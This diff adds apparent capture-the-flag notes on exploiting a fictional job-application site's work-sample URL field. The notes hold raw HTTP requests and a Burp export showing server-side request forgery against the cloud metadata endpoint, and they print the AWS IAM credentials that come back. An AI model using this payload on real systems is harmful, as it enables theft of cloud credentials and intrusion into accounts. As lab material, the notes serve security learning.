@@ -1,0 +1,75 @@
+apply.jackfrost.com
+
+GET /?inputName=jack+frist&inputEmail=firstyboy%40henlo.wtf&inputPhone=no&inputField=Bedtime+violation&resumeFile=README.md&inputWorkSample=http%3A%2F%2Fblakebourgeois.com%2FHELLO&additionalInformation=nO&submit= HTTP/2
+
+<?xml version="1.0"?>
+<!DOCTYPE items [
+<!ELEMENT items (item*)>
+<!ATTLIST items burpVersion CDATA "">
+<!ATTLIST items exportTime CDATA "">
+<!ELEMENT item (time, url, host, port, protocol, method, path, extension, request, status, responselength, mimetype, response, comment)>
+<!ELEMENT time (#PCDATA)>
+<!ELEMENT url (#PCDATA)>
+<!ELEMENT host (#PCDATA)>
+<!ATTLIST host ip CDATA "">
+<!ELEMENT port (#PCDATA)>
+<!ELEMENT protocol (#PCDATA)>
+<!ELEMENT method (#PCDATA)>
+<!ELEMENT path (#PCDATA)>
+<!ELEMENT extension (#PCDATA)>
+<!ELEMENT request (#PCDATA)>
+<!ATTLIST request base64 (true|false) "false">
+<!ELEMENT status (#PCDATA)>
+<!ELEMENT responselength (#PCDATA)>
+<!ELEMENT mimetype (#PCDATA)>
+<!ELEMENT response (#PCDATA)>
+<!ATTLIST response base64 (true|false) "false">
+<!ELEMENT comment (#PCDATA)>
+]>
+<items burpVersion="2021.10.3" exportTime="Wed Dec 22 19:58:07 CST 2021">
+  <item>
+    <time>Wed Dec 22 19:57:31 CST 2021</time>
+    <url><![CDATA[https://apply.jackfrosttower.com/images/yeet.jpg]]></url>
+    <host ip="34.117.109.159">apply.jackfrosttower.com</host>
+    <port>443</port>
+    <protocol>https</protocol>
+    <method><![CDATA[GET]]></method>
+    <path><![CDATA[/images/yeet.jpg]]></path>
+    <extension>jpg</extension>
+    <request base64="true"><![CDATA[R0VUIC9pbWFnZXMveWVldC5qcGcgSFRUUC8yDQpIb3N0OiBhcHBseS5qYWNrZnJvc3R0b3dlci5jb20NClNlYy1DaC1VYTogIiBOb3QgQTtCcmFuZCI7dj0iOTkiLCAiQ2hyb21pdW0iO3Y9Ijk2Ig0KU2VjLUNoLVVhLU1vYmlsZTogPzANClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS85Ni4wLjQ2NjQuNDUgU2FmYXJpLzUzNy4zNg0KU2VjLUNoLVVhLVBsYXRmb3JtOiAiV2luZG93cyINCkFjY2VwdDogaW1hZ2UvYXZpZixpbWFnZS93ZWJwLGltYWdlL2FwbmcsaW1hZ2Uvc3ZnK3htbCxpbWFnZS8qLCovKjtxPTAuOA0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtTW9kZTogbm8tY29ycw0KU2VjLUZldGNoLURlc3Q6IGltYWdlDQpSZWZlcmVyOiBodHRwczovL2FwcGx5LmphY2tmcm9zdHRvd2VyLmNvbS8/aW5wdXROYW1lPXllZXQmaW5wdXRFbWFpbD15ZWV0JTQwdGVleS5uZXQmaW5wdXRQaG9uZT05OTQtNDQ0LTM5OTMmaW5wdXRGaWVsZD1UaHJvd2luZytyb2NrcyslMjhub24tcGVyc29uK3RhcmdldCUyOSZyZXN1bWVGaWxlPVJFQURNRS5tZCZpbnB1dFdvcmtTYW1wbGU9aHR0cCUzQSUyRiUyRjE2OS4yNTQuMTY5LjI1NCUyRmxhdGVzdCZhZGRpdGlvbmFsSW5mb3JtYXRpb249bm8mc3VibWl0PQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC45DQoNCg==]]></request>
+    <status>200</status>
+    <responselength>333</responselength>
+    <mimetype>text</mimetype>
+    <response base64="true"><![CDATA[SFRUUC8yIDIwMCBPSw0KU2VydmVyOiBuZ2lueC8xLjE2LjENCkRhdGU6IFRodSwgMjMgRGVjIDIwMjEgMDE6NTc6MzAgR01UDQpDb250ZW50LVR5cGU6IGltYWdlL2pwZWcNCkNvbnRlbnQtTGVuZ3RoOiAxOA0KTGFzdC1Nb2RpZmllZDogVGh1LCAyMyBEZWMgMjAyMSAwMTo1NzozMCBHTVQNCkV0YWc6ICI2MWMzZDc4YS0xMiINCkV4cGlyZXM6IFR1ZSwgMjggRGVjIDIwMjEgMDE6NTc6MzAgR01UDQpDYWNoZS1Db250cm9sOiBtYXgtYWdlPTQzMjAwMA0KQWNjZXB0LVJhbmdlczogYnl0ZXMNClZpYTogMS4xIGdvb2dsZQ0KQWx0LVN2YzogY2xlYXINCg0KZHluYW1pYwptZXRhLWRhdGEK]]></response>
+    <comment></comment>
+  </item>
+</items>
+
+response is coded into the name.jpg file returned by the host
+
+GET /?inputName=yeet&inputEmail=&inputPhone=&resumeFile=&inputWorkSample=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2Fiam%2Fsecurity-credentials%2Fjf-deploy-role&additionalInformation=&submit= HTTP/2
+Host: apply.jackfrosttower.com
+Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="96"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-Fetch-Site: none
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+
+
+{
+	"Code": "Success",
+	"LastUpdated": "2021-05-02T18:50:40Z",
+	"Type": "AWS-HMAC",
+	"AccessKeyId": "AKIA5HMBSK1SYXYTOXX6",
+	"SecretAccessKey": "CGgQcSdERePvGgr058r3PObPq3+0CfraKcsLREpX",
+	"Token": "NR9Sz/7fzxwIgv7URgHRAckJK0JKbXoNBcy032XeVPqP8/tWiR/KVSdK8FTPfZWbxQ==",
+	"Expiration": "2026-05-02T18:50:40Z"
+}
+
